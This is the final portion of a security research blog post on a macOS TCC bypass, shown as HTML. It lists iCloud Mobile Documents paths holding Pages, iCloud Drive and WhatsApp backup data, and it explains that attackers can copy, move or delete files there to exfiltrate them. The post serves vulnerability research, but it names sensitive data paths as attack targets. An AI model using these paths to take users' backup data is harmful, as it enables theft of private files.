+<h3 id="Examples-of-Sensitive-Data-Paths"><a href="#Examples-of-Sensitive-Data-Paths" class="headerlink" title="Examples of Sensitive Data Paths"></a><strong>Examples of Sensitive Data Paths</strong></h3><ol>
+<li><p><strong>Apple Pages backup documents</strong></p>
+<p> &#x1F4C2; <code>/var/mobile/Library/Mobile Documents/com~apple~Pages</code></p>
+</li>
+<li><p><strong>Files manually saved to iCloud Drive (including Downloads)</strong></p>
+<p> &#x1F4C2; <code>/var/mobile/Library/Mobile Documents/com~apple~CloudDocs</code></p>
+</li>
+<li><p><strong>WhatsApp backup data</strong></p>
+<p> &#x1F4C2; <code>/var/mobile/Library/Mobile Documents/57T9237FN3~net~whatsapp~WhatsApp</code></p>
+<p> (<em>This path uses a fixed identifier instead of a UUID, making it predictable for attackers.</em>)</p>
+</li>
+</ol>
+<p>By exploiting this vulnerability, attackers can access and exfiltrate <strong>iCloud backup data</strong> belonging to both first-party and third-party apps. They can do this by <strong>copying, moving, or deleting</strong> files and directories under the main target data path: &#x1F4C2; <strong><code>/var/mobile/Library/Mobile Documents/</code></strong></p>
+<hr>
+<h3 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/">https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://zeroclick.sh/blog/macos-tcc/">https://zeroclick.sh/blog/macos-tcc/</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cyberlibrary.fr/en/docs/old/macos-tcc-bypasses">https://www.cyberlibrary.fr/en/docs/old/macos-tcc-bypasses</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://eclecticlight.co/2023/02/10/privacy-what-tcc-does-and-doesnt/">https://eclecticlight.co/2023/02/10/privacy-what-tcc-does-and-doesnt/</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.kandji.io/blog/macos-audit-story-part2">https://www.kandji.io/blog/macos-audit-story-part2</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/clalxk/">clalxk</a>
+                  
+                  <a class="hover-with-bg" href="/tags/MacOS/">MacOS</a>
+                  
+                  <a class="hover-with-bg" href="/tags/TCC-Bypass/">TCC Bypass</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_clalxk.jpg" srcset="/img/loading.gif" alt="clalxk">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">clalxk</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/clalxk">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              
+              <!--  -->
+              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
+              
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                  <a href="/2025/01/22/ogu123/cve-2024-38100/">
+                    <i class="iconfont icon-arrowleft"></i>
+                    <span class="hidden-mobile">[하루한줄] CVE-2024-38100: Windows File Explorer Elevation of Privilege Vulnerability</span>
+                    <span class="visible-mobile">Previous</span>
+                  </a>
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/">
+                    <span class="hidden-mobile">[Research] MacOS TCC Bypass (ko)</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+            
+            <!-- Embed Section -->
+            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
+              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
+            </div>            
+
+            
+            <!-- Comments -->
+            <article class="comments" id="comments">
+              
+              
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/';
+        this.page.identifier = '/2025/01/19/clalxk/MacOS_TCC-Bypass_en/';
+      };
+      function loadDisqus() {
+        (function () {
+          var d = document,
+            s = d.createElement('script');
+          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      }
+      waitElementVisible('disqus_thread', loadDisqus);
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+            </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[Research] MacOS TCC Bypass (en)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
